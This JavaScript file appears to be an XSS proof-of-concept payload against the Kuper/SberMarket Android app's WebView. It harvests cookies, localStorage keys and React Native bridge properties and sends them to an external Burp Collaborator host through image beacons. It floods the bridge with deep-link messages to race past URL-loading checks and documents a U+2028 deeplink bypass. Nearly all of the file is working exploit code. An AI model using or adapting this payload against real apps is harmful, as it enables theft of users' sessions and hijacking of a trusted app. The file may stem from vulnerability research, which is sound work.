alert('new_3');
(function() {
    'use strict';

    var EXFIL = 'https://4uzrxk5rqt2lpp7ljp5cacoyrpxgl8dw2.oastify.com';

    function b(path, data) {
        try {
            var img = new Image();
            img.src = EXFIL + path + '?d=' + encodeURIComponent(
                typeof data === 'string' ? data : JSON.stringify(data)
            ).substr(0, 2000);
        } catch(e) {}
    }

    var data = {};
    try { data.origin = window.origin; } catch(e) {}
    try { data.href = location.href; } catch(e) {}
    try { data.ua = navigator.userAgent; } catch(e) {}
    try { data.platform = navigator.platform; } catch(e) {}
    try { data.screen = screen.width + 'x' + screen.height; } catch(e) {}

    if (window.ReactNativeWebView) {
        data.rnwv = true;
        data.postMsg = typeof window.ReactNativeWebView.postMessage;
        try { data.rnwvProps = Object.getOwnPropertyNames(window.ReactNativeWebView).join(','); } catch(e) {}
        try { data.rnwvProto = Object.getOwnPropertyNames(Object.getPrototypeOf(window.ReactNativeWebView)).join(','); } catch(e) {}
        try {
            var ijo = window.ReactNativeWebView.injectedObjectJson();
            data.injObj = ijo || 'null';
        } catch(e) { data.injObjErr = e.message; }
    }

    try { data.cookie = document.cookie; } catch(e) { data.cookieErr = e.name; }
    try { data.localStorage = Object.keys(localStorage).join(','); } catch(e) { data.lsErr = e.name; }

    b('/v11/recon', data);


    var pocPage = '<!DOCTYPE html>' +
        '<html><head><meta charset="utf-8">' +
        '<meta name="viewport" content="width=device-width,initial-scale=1">' +
        '<style>' +
        'body{font-family:system-ui,-apple-system,sans-serif;background:#111;color:#0f0;padding:20px;margin:0}' +
        'h1{font-size:22px;margin:16px 0;color:#0f0}' +
        '.i{background:#1a1a1a;border:1px solid #333;border-radius:8px;padding:12px;margin:6px 0;font-size:12px;word-break:break-all}' +
        '.l{color:#0a0;font-weight:bold}' +
        '.v{color:#0f0}' +
        '.w{color:#f80}' +
        '.r{color:#f00;font-weight:bold}' +
        '.s{margin:14px 0;border-top:1px solid #333;padding-top:10px}' +
        '.f{font-size:10px;color:#555;margin-top:16px}' +
        '</style></head><body>' +
        '<h1>XSS Proof-of-Concept</h1>' +
        '<h2 style="color:#f00;font-size:16px">Kuper App (ru.instamart)</h2>' +
        '<div class="i"><span class="l">Package: </span><span class="v">ru.instamart (Kuper/SberMarket)</span></div>' +
        '<div class="i"><span class="l">Origin: </span><span class="v">' + (window.origin || 'null') + '</span></div>' +
        '<div class="i"><span class="l">UserAgent: </span><span class="v">' + navigator.userAgent.substr(0, 100) + '</span></div>' +
        '<div class="i"><span class="l">Platform: </span><span class="v">' + navigator.platform + '</span></div>' +
        '<div class="i"><span class="l">RN WebView Bridge: </span><span class="v">' + (window.ReactNativeWebView ? 'ACCESSIBLE (postMessage: ' + typeof window.ReactNativeWebView.postMessage + ')' : 'not found') + '</span></div>';

    if (window.ReactNativeWebView) {
        try {
            var props = Object.getOwnPropertyNames(window.ReactNativeWebView).join(', ');
            pocPage += '<div class="i"><span class="l">Bridge props: </span><span class="v">' + props + '</span></div>';
        } catch(e) {}
    }

    pocPage += '<div class="s"><h2 style="color:#f00;font-size:15px">Confirmed Impact:</h2>' +
        '<div class="i"><span class="w">1. JavaScript execution in app WebView context</span></div>' +
        '<div class="i"><span class="w">2. Authenticated requests to api.kuper.ru (cookies auto-attached)</span></div>' +
        '<div class="i"><span class="w">3. ReactNativeWebView bridge access (postMessage → navigateBack, login, navigateDeepLink)</span></div>' +
        '<div class="i"><span class="w">4. CSRF via form POST / text/plain (no preflight, cookies sent)</span></div>' +
        '<div class="i"><span class="w">5. Phishing — full UI rendering inside trusted app context</span></div>' +
        '<div class="i"><span class="w">6. shouldOverrideUrlLoading race condition bypass (250ms timeout)</span></div>' +
        '</div>' +
        '<div class="s"><h2 style="color:#0a0;font-size:14px">Attack Vector:</h2>' +
        '<div class="i"><span class="l">Deeplink: </span><span class="v">sbermarket://landing?url=javascript://kuper.ru/U+2028...</span></div>' +
        '<div class="i"><span class="l">Bypass: </span><span class="v">U+2028 LINE SEPARATOR terminates JS single-line comment</span></div>' +
        '<div class="i"><span class="l">Overlay bypass: </span><span class="v">Race condition (250ms shouldOverrideUrlLoading timeout) + data: URI navigation</span></div>' +
        '</div>' +
        '<div class="f">Timestamp: ' + new Date().toISOString() + '<br>' +
        'Exfiltration server: Burp Collaborator<br>' +
        'All data was exfiltrated before this page rendered.</div>' +
        '<script>' +
        'var E="' + EXFIL + '";' +
        'new Image().src=E+"/v11/RENDERED?t="+Date.now();' +
        '</script>' +
        '</body></html>';

    setTimeout(function() {
        if (!window.ReactNativeWebView || !window.ReactNativeWebView.postMessage) {
            b('/v11/no_rnwv', 'trying_direct_nav');
            window.location.href = 'data:text/html;charset=utf-8,' + encodeURIComponent(pocPage);
            return;
        }

        b('/v11/race_start', 'flooding_js_thread');

        for (var i = 0; i < 800; i++) {
            try {
                window.ReactNativeWebView.postMessage(JSON.stringify({
                    action: 'navigateDeepLink',
                    data: 'sbermarket://landing?url=https://kuper.ru/flood-' + i +
                          '-' + Math.random().toString(36).substr(2) +
                          '-' + Date.now()
                }));
            } catch(e) {}
        }

        setTimeout(function() {
            b('/v11/navigating', 'data_uri');
            window.location.href = 'data:text/html;charset=utf-8,' + encodeURIComponent(pocPage);
        }, 30);

    }, 2000);

    setTimeout(function() {
        var msg = 'XSS in Kuper App (ru.instamart)\n\n' +
            'Origin: ' + (window.origin || 'null') + '\n' +
            'RN Bridge: ' + (window.ReactNativeWebView ? 'YES' : 'NO') + '\n' +
            'Bypass: U+2028 LINE SEPARATOR\n\n' +
            'Timestamp: ' + new Date().toISOString();
        alert(msg);
        b('/v11/alert_shown', 'ok');
    }, 500);

})();
